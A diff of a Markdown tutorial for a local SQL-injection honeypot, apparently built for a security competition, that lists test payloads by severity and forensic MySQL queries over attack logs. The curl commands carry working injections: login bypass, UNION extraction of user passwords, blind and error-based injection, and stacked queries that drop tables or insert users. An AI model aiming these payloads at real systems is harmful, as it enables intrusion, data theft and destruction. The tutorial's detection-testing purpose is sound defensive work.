@@ -1,6 +1,239 @@
 # SQL Injection Honeypot Tutorial
 
-This tutorial demonstrates various SQL injection attacks and how our Honeypot Security Information and Event Management (HSIEM) system detects and classifies them. We'll explore different severity levels of attacks and analyze the system's response.
+This tutorial demonstrates different types of SQL injection attacks and how they are detected and classified by the honeypot system.
+
+## Attack Examples by Severity Level
+
+### LOW Severity Attacks (0.0-0.3)
+These attacks use basic SQL injection patterns like comments and simple LIKE injections.
+
+```bash
+# Test basic comment injection
+curl "http://localhost:9000/api/products?category=test'--"
+
+# Test simple LIKE injection
+curl "http://localhost:9000/api/products?category=test%' LIKE '%"
+```
+
+### MEDIUM Severity Attacks (0.3-0.5)
+These attacks attempt authentication bypass using OR/AND conditions.
+
+```bash
+# Test login bypass with OR condition
+curl -X POST http://localhost:9000/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin' OR '1'='1&password=anything"
+
+# Test login bypass with always true condition
+curl -X POST http://localhost:9000/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin' OR 'x'='x&password=anything"
+```
+
+### HIGH Severity Attacks (0.5-0.7)
+These attacks attempt to extract data using UNION SELECT statements.
+
+```bash
+# Test UNION SELECT injection
+curl "http://localhost:9000/api/products?category=1' UNION SELECT NULL,NULL,NULL,NULL,NULL --"
+
+# Test data extraction attempt
+curl "http://localhost:9000/api/products?category=1' UNION SELECT username,password,email,id,NULL FROM users --"
+```
+
+### CRITICAL Severity Attacks (0.7-1.0)
+These attacks attempt schema enumeration or destructive operations.
+
+```bash
+# Test schema enumeration
+curl "http://localhost:9000/api/products?category=1' UNION ALL SELECT NULL,NULL,NULL,table_name,NULL FROM information_schema.tables --"
+
+# Test destructive operation
+curl "http://localhost:9000/api/products?category=1'; DROP TABLE users; --"
+```
+
+## Advanced Attack Scenarios
+
+### 1. Blind SQL Injection (MEDIUM-HIGH)
+These attacks attempt to extract data without seeing the direct output.
+
+```bash
+# Time-based blind injection
+curl "http://localhost:9000/api/products?category=1' AND IF(SUBSTRING(DATABASE(),1,1)='h',SLEEP(2),0) --"
+
+# Boolean-based blind injection
+curl "http://localhost:9000/api/products?category=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>50 --"
+```
+
+### 2. Error-Based Injection (HIGH)
+Exploiting database errors to extract information.
+
+```bash
+# Using EXTRACTVALUE for error messages
+curl "http://localhost:9000/api/products?category=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) --"
+
+# Using UPDATEXML for data extraction
+curl "http://localhost:9000/api/products?category=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1) --"
+```
+
+### 3. Stacked Queries (CRITICAL)
+Multiple SQL statements in one query.
+
+```bash
+# Multiple operations
+curl "http://localhost:9000/api/products?category=1'; INSERT INTO users (username,password) VALUES ('hacker','pwd'); --"
+
+# Backup table creation
+curl "http://localhost:9000/api/products?category=1'; CREATE TABLE backup AS SELECT * FROM users; --"
+```
+
+### 4. Advanced Schema Analysis (CRITICAL)
+Detailed database structure enumeration.
+
+```bash
+# Column enumeration
+curl "http://localhost:9000/api/products?category=1' UNION ALL SELECT NULL,column_name,NULL,table_name,NULL FROM information_schema.columns WHERE table_schema='honeypot_db' --"
+
+# Privilege enumeration
+curl "http://localhost:9000/api/products?category=1' UNION ALL SELECT NULL,grantee,NULL,privilege_type,NULL FROM information_schema.user_privileges --"
+```
+
+## Attack Patterns and Detection
+
+### Pattern Analysis Examples
+
+1. **Basic Pattern (LOW)**
+```sql
+-- Original Query
+SELECT * FROM products WHERE category = 'test'
+-- Injection
+SELECT * FROM products WHERE category = 'test' OR '1'='1' --'
+```
+
+2. **Authentication Bypass (MEDIUM)**
+```sql
+-- Original Query
+SELECT * FROM users WHERE username='admin' AND password='pass'
+-- Injection
+SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='anything'
+```
+
+3. **Data Extraction (HIGH)**
+```sql
+-- Original Query
+SELECT * FROM products WHERE category = '1'
+-- Injection
+SELECT * FROM products WHERE category = '1' UNION SELECT username,password,email,id,NULL FROM users --'
+```
+
+4. **Schema Analysis (CRITICAL)**
+```sql
+-- Original Query
+SELECT * FROM products WHERE category = '1'
+-- Injection
+SELECT * FROM products WHERE category = '1' UNION ALL SELECT NULL,table_name,NULL,column_name,NULL FROM information_schema.columns --'
+```
+
+## Forensic Analysis Examples
+
+### 1. Attack Chain Analysis
+```bash
+# Get sequence of attacks from same IP
+mysql -u honeypot -phoneypot -e "SELECT timestamp, type, risk_score, attack_details FROM honeypot_db.attack_logs WHERE source_ip='127.0.0.1' ORDER BY timestamp ASC;"
+```
+
+### 2. Pattern Evolution
+```bash
+# Analyze how attack patterns evolve
+mysql -u honeypot -phoneypot -e "SELECT attack_type, COUNT(*) as count, AVG(risk_score) as avg_risk FROM honeypot_db.attack_logs GROUP BY attack_type ORDER BY avg_risk DESC;"
+```
+
+### 3. Timeline Analysis
+```bash
+# Get attack timeline with details
+mysql -u honeypot -phoneypot -e "SELECT DATE_FORMAT(timestamp, '%Y-%m-%d %H:00:00') as hour, COUNT(*) as attacks, AVG(risk_score) as avg_risk FROM honeypot_db.attack_logs GROUP BY hour ORDER BY hour DESC;"
+```
+
+### 4. Attack Vector Analysis
+```bash
+# Analyze common attack vectors
+mysql -u honeypot -phoneypot -e "SELECT request_path, COUNT(*) as count, AVG(risk_score) as avg_risk FROM honeypot_db.attack_logs GROUP BY request_path ORDER BY count DESC;"
+```
+
+## Presentation Guidelines
+
+### For Forensics Judge
+
+1. **Evidence Collection**
+   - Demonstrate comprehensive logging
+   - Show attack chain analysis
+   - Present timeline reconstruction
+   - Highlight pattern evolution tracking
+
+2. **Analysis Capabilities**
+   - Real-time event correlation
+   - Risk score calculation methodology
+   - Attack pattern classification
+   - Source attribution techniques
+
+3. **Investigation Tools**
+   - HSIEM dashboard features
+   - Log analysis capabilities
+   - Query and filtering tools
+   - Timeline visualization
+
+### For VAPT Judge
+
+1. **Attack Detection**
+   - Pattern recognition system
+   - ML-based classification
+   - Real-time monitoring
+   - Risk scoring algorithm
+
+2. **Defense Mechanisms**
+   - Honeypot architecture
+   - Deception techniques
+   - Response strategies
+   - Alert mechanisms
+
+3. **Testing Methodology**
+   - Attack vectors covered
+   - Severity classification
+   - Detection accuracy
+   - False positive handling
+
+## Understanding Attack Detection
+
+Each attack is processed through multiple layers:
+
+1. **Pattern Recognition**: The honeypot matches known SQL injection patterns
+2. **Risk Scoring**: A risk score is calculated based on pattern severity and ML analysis
+3. **HSIEM Integration**: Attacks are logged and displayed in the HSIEM dashboard
+
+## Viewing Attack Results
+
+You can view the results of attacks in several ways:
+
+1. Check the HSIEM dashboard at http://localhost:9000/hsiem
+2. View the logs in `hsiem_logs/` directory
+3. Query the database directly:
+
+```bash
+mysql -u honeypot -phoneypot -e "SELECT timestamp, source_ip, type, risk_score FROM honeypot_db.attack_logs ORDER BY timestamp DESC LIMIT 5;"
+```
+
+## Risk Score Breakdown
+
+The risk score for each attack is calculated using:
+- Pattern-based score (70% weight)
+- Machine Learning score (30% weight)
+- Multiple pattern bonus (+0.1 per additional pattern)
+
+Example severity classifications:
+- LOW (0.0-0.3): Comment injections, simple patterns
+- MEDIUM (0.3-0.5): Authentication bypass attempts
+- HIGH (0.5-0.7): Data extraction attempts
+- CRITICAL (0.7-1.0): Schema enumeration, destructive operations
 
 ## Setup Requirements
 
@@ -9,136 +242,6 @@ This tutorial demonstrates various SQL injection attacks and how our Honeypot Se
 - MySQL/MariaDB database
 - Basic understanding of SQL injection techniques
 - Web browser (Chrome/Firefox recommended)
-
-## Attack Scenarios and Detection
-
-### 1. LOW Severity Attack - Comment Injection
-**Risk Score: 0.357**
-
-This basic attack attempts to manipulate SQL query logic using comment syntax.
-
-**Browser Method:**
-1. Navigate to `http://localhost:9000/products`
-2. In the category search box, enter: `test'--`
-3. Press Enter or click Search
-
-**Curl Method:**
-```bash
-curl "http://localhost:9000/api/products?category=test'--"
-```
-
-**Attack Details:**
-- Type: SQL_INJECTION_PRODUCTS
-- Injection Point: category_parameter
-- Target: product_query
-- Technique: Comment-based query manipulation
-
-**Detection:**
-The system identifies this as a low-risk attack due to:
-- Simple comment injection pattern
-- No attempt to extract data
-- Basic query manipulation
-
-### 2. MEDIUM Severity Attack - Authentication Bypass
-**Risk Score: 0.398**
-
-This attack attempts to bypass login authentication using OR conditions.
-
-**Browser Method:**
-1. Navigate to `http://localhost:9000/login`
-2. In the username field, enter: `admin' OR '1'='1`
-3. In the password field, enter: `anything`
-4. Click Login
-
-**Curl Method:**
-```bash
-curl -X POST "http://localhost:9000/login" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "username=admin' OR '1'='1&password=anything"
-```
-
-**Attack Details:**
-- Type: SQL_INJECTION_LOGIN
-- Injection Point: login_form
-- Target: authentication
-- Technique: Boolean-based authentication bypass
-
-**Detection:**
-Classified as medium severity because:
-- Targets authentication mechanism
-- Uses boolean logic manipulation
-- Attempts privilege escalation
-
-### 3. HIGH Severity Attack - Data Extraction
-**Risk Score: 0.532**
-
-This attack attempts to extract data from the database using UNION-based injection.
-
-**Browser Method:**
-1. Navigate to `http://localhost:9000/products`
-2. In the URL bar, modify the category parameter:
-   ```
-   http://localhost:9000/products?category=1' UNION SELECT id,name,description,price,category FROM products --
-   ```
-3. Press Enter
-
-**Curl Method:**
-```bash
-curl "http://localhost:9000/api/products?category=1' UNION SELECT id,name,description,price,category FROM products --"
-```
-
-**Attack Details:**
-- Type: SQL_INJECTION_PRODUCTS
-- Injection Point: category_parameter
-- Target: product_query
-- Technique: UNION-based data extraction
-
-**Detection:**
-Marked as high severity because:
-- Uses UNION operator for data extraction
-- Attempts to read sensitive table data
-- Shows knowledge of database schema
-
-### 4. CRITICAL Severity Attack - Schema Enumeration
-**Risk Score: 0.703**
-
-This sophisticated attack attempts to enumerate database schema and perform destructive operations.
-
-**Browser Method:**
-1. Open Browser Developer Tools (F12)
-2. Navigate to `http://localhost:9000/products`
-3. In the URL bar, paste the following (after proper URL encoding):
-   ```
-   http://localhost:9000/products?category=1' UNION ALL SELECT NULL,table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='honeypot_db'; --
-   ```
-4. Press Enter
-
-**Alternative Browser Method:**
-1. Navigate to `http://localhost:9000/products`
-2. Open Browser Developer Tools (F12)
-3. In Console, execute:
-   ```javascript
-   fetch('/api/products?category=' + encodeURIComponent("1' UNION ALL SELECT NULL,table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='honeypot_db'; --"))
-   .then(r => r.json())
-   .then(console.log)
-   ```
-
-**Curl Method:**
-```bash
-curl "http://localhost:9000/api/products?category=1' UNION ALL SELECT NULL,table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='honeypot_db'; --"
-```
-
-**Attack Details:**
-- Type: SQL_INJECTION_PRODUCTS
-- Injection Point: category_parameter
-- Target: product_query
-- Technique: Schema enumeration with information_schema
-
-**Detection:**
-Classified as critical severity because:
-- Accesses system tables (information_schema)
-- Attempts to enumerate database structure
-- Shows advanced SQL injection knowledge
 
 ## Real-time Monitoring
 
